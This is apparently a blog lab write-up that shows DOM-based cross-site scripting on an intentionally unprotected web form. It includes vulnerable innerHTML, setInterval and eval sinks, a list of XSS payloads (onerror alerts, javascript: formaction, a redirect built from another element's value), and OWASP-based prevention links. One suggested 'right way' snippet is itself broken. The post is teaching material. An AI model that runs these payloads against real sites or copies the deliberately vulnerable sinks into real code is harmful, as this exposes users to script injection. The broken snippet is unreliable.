---
title: Have you seen xss?
description: How to execute script in unprotected form input
date: "2023-11-14T10:37:55+02:00"
publishDate: "2023-11-14T12:05:01+02:00"
---
Laboration to see XSS occur in webform. 

"Ok, I got the point about cross site scripting, but I want to see it."  

Xss occurs when webform input is converted into javascript and executed in the context of the site. The protection is "validation of input and sanitazon of output". But, how, does this really occur? How can this be tested? This post examines this.
<!--more-->


## goal
How can an unprotected form be used to trigger an alert prompt?

## TL;DR
When nonvalidated input is added to an element with "innerHTML" without replacement of special characters, it can be used to convert the text into javascript, due to browsers responsibility to convert markup into both text and scripts. Script are triggered when input is added to the DOM independent of the form is submitted. 
- insertion of input like &lt;img&#32;src&#61;&#39;x&#39;&#32;onerror&#61;&#39;alert&#40;1&#41;&#39;&gt; triggers alert prompt
- insertion of input like &lt;script&gt;alert(1);&lt;script&gt; does not trigger alert  prompt  

Xss is prevented by validation of input, and thereafter sanitized before further usage. The server must always redo this, but this is outside the scope of this article.

### The vulnerability
*Cross-site scripting (XSS) is a type of coding vulnerability. It is usually found in web applications. XSS enables attackers to inject malicious into web pages viewed by other users. XSS may allow attackers to bypass access controls such
as the same-origin policy may. This is one of the most common vulnerabilities found accordingly with OWASP Top 10. Symantec in its annual threat report found that XSS was the number two vulnerability found on web servers. The severity/risk of this vulnerability may range from a nuisance to a major security risk, depending on the sensitivity of the data handled by the vulnerable site and the nature of any security mitigation implemented by the site’s organization.*  
[OWASP code review](https://owasp.org/www-project-code-review-guide/assets/OWASP_Code_Review_Guide_v2.pdf)


## xss laboration code  
The laboration uses an unprotected form to test xss byt html injection. 
The github example includes a local server to evaluate the data passed to the server.  
Code: [https://github.com/sundvall/security-labs](https://github.com/sundvall/security-labs)

Alternative setups to test html injection may be found at [Owasp](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection#:~:text=This%20vulnerability%20occurs%20when%20user,HTML%20page%20to%20a%20victim.)

### The html and javascript
The markup of the laboration consists of a form with a text-input. It's value is retrieved by the javascript click handler, and inserted into an output element.


[This doc from MDN is used to create output](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Safely_inserting_external_content_into_a_page)
Other possibilities are "setAttribute" and "createTextNode". The laboration intentionally make use of notorious "innerHTML".

```HTML
<form method="post" action="/bar">
  <!-- input field -->
  <input id="bad-input" name="foo-input" type="text" />
  <!-- submit -->
  <input type="submit" id="innerhtml" value="innerHTML" type="button">
  <input type="submit" id="textcontent" value="textcontent" type="button">
  <input type="submit" id="sethtml" value="sethtml" type="button">
</form>

<!-- element targeted for injection -->
<output id="the-output"></output>

```


### Scripts
Three clickhandlers are added to use three variations of insertion: innehHTML, textContent and setHTML. 

Also other methods are cabable of text to script conversion. One of them is "setInterval". This is added to the page and evaluates the forminput directly without any sanitazion and may be interrupted.

```javascript
   // Print the value as innerHTML to the output element
  document.querySelector('#innerhtml').addEventListener(
      'click', event => {
          event.preventDefault();
          const badInputElm = document.querySelector('#bad-input');
          const outputElm = document.querySelector('#the-output');
          outputElm.innerHTML = badInputElm.value;
      });
      
  // Print the value as innerHTML to the output element
  document.querySelector('#textcontent').addEventListener(
      'click', event => {
          event.preventDefault();
          const badInputElm = document.querySelector('#bad-input');
          const outputElm = document.querySelector('#the-output');
          outputElm.textContent = badInputElm.value;
      });

  // Print the value as setHTML to the output element requires sanitizer
  document.querySelector('#sethtml').addEventListener(
      'click', event => {
          event.preventDefault();
          const badInputElm = document.querySelector('#bad-input');
          const outputElm = document.querySelector('#the-output');
          const defaultSanitizer = new Sanitizer();
          outputElm.setHTML(badInputElm.value, { sanitizer: defaultSanitizer });
      });

  // Evalute the form with setInterval:
  const badInputElm = document.querySelector('#bad-input');
  const timeId = setInterval(badInputElm.value, 500);
  document.querySelector('#stop-timer').addEventListener('click', () => clearInterval(timeId))

// Evaluate the form with "eval":
  document.querySelector('#evil-eval').addEventListener(
      'click', event => {
          event.preventDefault();
          const badInputElm = document.querySelector('#bad-input');
          eval(badInputElm.value);
  });
```

### local server
A local node server is created with express.js to investigate the data received serverside. 
This is not important to see the xss occur, but is useful to reach further understanding of the interaction server-client.

```javascript
app.post('/bar', function (req, res) {
  console.log('url:', req.url);
  console.log('post request: requestbody:', req.body);
  console.log('post query: :', req.query);
  res.sendFile(`${__dirname}/public/index.html`);
});
```

## testcases

All testcases are found at [https://html5sec.org/](https://html5sec.org/).

### converts to javascript
All these strings are converted into javascript:
```HTML
<img src='x' onerror='alert(1)'>

<form id="test"></form><button form="test" formaction="javascript:alert('what???')">Click here - execute exiting script!</button>

<form id="test"></form><button form="test" formaction="javascript:console.log('what???')">Click here - execute exiting script!</button>

<form id="test"></form><button form="test" formaction="javascript:fetch('http://localhost:3456').then((e,f)=>console.log(e)).catch(f=>console.log(f))">Click here - execute fetch!</button>

<input onfocus=write('console') autofocus>

<input onfocus=write('console.log') autofocus>

<video><source onerror="alert(1)">
```

This script has the effect of replacement of the entire content whenever "tab" or "click" is used:
```HTML
<input onfocus=write(1) autofocus>// denna rad lägger till en nod så att när man klickar eller tabbar på sidan så byts allt innehåll till statement i 'write'
```
This script prints a number, but only for "x" and does not work with for example "alert(y)":
```HTML
<img src='x' onerror='alert(x)'>
```

This script replaces the current page with an svg:
```HTML
<a href="javascript:&apos;<svg onload&equals;alert&lpar;1&rpar;&nvgt;&apos;">CLICK</a>
```

This script gets the value of another element and adds it to a redirection:
```HTML
<img src='x' onerror='window.location.href=(document.querySelector("#treasure").value)'>
```




## Converts partly or not into javascript

If src='foo' is replaced by src='x' this converts into script:
```HTML
<img src='foo' onerror='alert(1)'>
```

This script creates an input element which gives error in console:
"Autofocus processing was blocked because a document already has a focused element."
When the element is focused another error is displayed:
"Invalid or unexpected token (at (index):1:7)"
```HTML
<input onfocus=write('all content visible after interaction') autofocus>  
```

This script creates an input element. When the element is focused another error is displayed:
"Unexpected token '<' (at (index):1:7)"

```HTML
<input onfocus=write(<script>all text in the bodytag of a new document</script) autofocus>
```

This script creates an input element. When the element is focused another error is displayed:
"Invalid or unexpected token (at (index):1:7)"
```HTML
<input onfocus=write('all content visible after interaction') autofocus>
```

This script creates an input element. When the element is focused another error is displayed:
"Invalid or unexpected token (at (index):1:7)"
If only the 'console.log(1)' remains, the entire page is replaced with this text.
```HTML
<input onfocus=write('console.log(1) and more') autofocus>
```

This script creates an input element. When the element is focused a script node is added to the dom, visible in devtools "sources". 
```HTML
<input onfocus=write('<script>console.log(1)_and_more') autofocus>
```



## The treatment
To fully protect against xss in forms is out of the scope of this article. Some guiding links and advice follows.

### General approach
*Search for all places where user input through a HTTP request could possibly make its way into the HTML output.*  
[MDN](https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation)  

### What does the library provide?
It is useful to understand sequrity risks based on user input, to be able to take the adequate measures. It is valuable to be able to estimate the amount of safety measures that is enough for a specific application. For example, the framework [Angular](https://angular.io/guide/security#preventing-cross-site-scripting-xss) provides protection against xss, and how much extra protective measures then have to be implemented? 

### Svg's and attributes
*Be very careful when HTML attributes are used to carry HTML data that is later being used on the website"* 
*Make sure that user submitted SVG data and SVG files are treated as XML documents - not as images. The nature of SVG allows to include almost arbitrary XML data including JavaScript leading to XSS or worse.*
[https://html5sec.org/](https://html5sec.org/)


### A right way to add a script using innerHTML
```javascript
const script= document.createElement("script");
script.innerhtml="<script> Your script here </script>";
element.appendChild( script );
``````

[tutorialspoint.com](https://www.tutorialspoint.com/can-scripts-be-inserted-with-innerhtml#:~:text=Inserting%20a%20script%20with%20innerHTML&text=We%20cannot%20use%20the%20innerHTML,has%20to%20add%20a%20script.)


### Escape special characters with htmlentities 
Some guiding text in the html is written with htmlentitites. Unless, it is transformed into code, which itself describes the problem this article and laboration is dedicated to.  
[more about html entities here](https://www.freeformatter.com/html-entities.html) 

Example: 
To write this line for an image tag...
```HTML
<img src='x' onerror='alert(1)'>"
```
...special characters must be replaced:
```HTML
&lt;img&#32;src&#61;&#39;x&#39;&#32;onerror&#61;&#39;alert&#40;1&#41;&#39;&gt;
```

## References

["XSS Owasp"](https://owasp.org/www-community/attacks/xss/)  

****"search for all places where user input through a HTTP request could possibly make its way into the HTML output."
[MDN] (https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation)  

#### Owasp Code review
Especially page 73 about XSS in frameworks
and page 190 about clientside javascript.
[Owasp codereview pdf](https://owasp.org/www-project-code-review-guide/assets/OWASP_Code_Review_Guide_v2.pdf)  


### Owasp Cheatsheet 
This cheatsheet is a list of techniques to prevent or limit the impact of XSS. No single technique will solve XSS. Using the right combination of defensive techniques is necessary to prevent XSS.
Understand how your framework prevents XSS and where it has gaps. There will be times where you need to do something outside the protection provided by your framework. This is where Output Encoding and HTML Sanitization are critical. OWASP are producing framework specific cheatsheets for React, Vue, and Angular.  
[Owasp cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)

### General info about webforms
[More about forms](https://www.twilio.com/blog/everything-you-ever-wanted-to-know-about-secure-html-forms-html)

### More testcases
[https://html5sec.org/](https://html5sec.org/)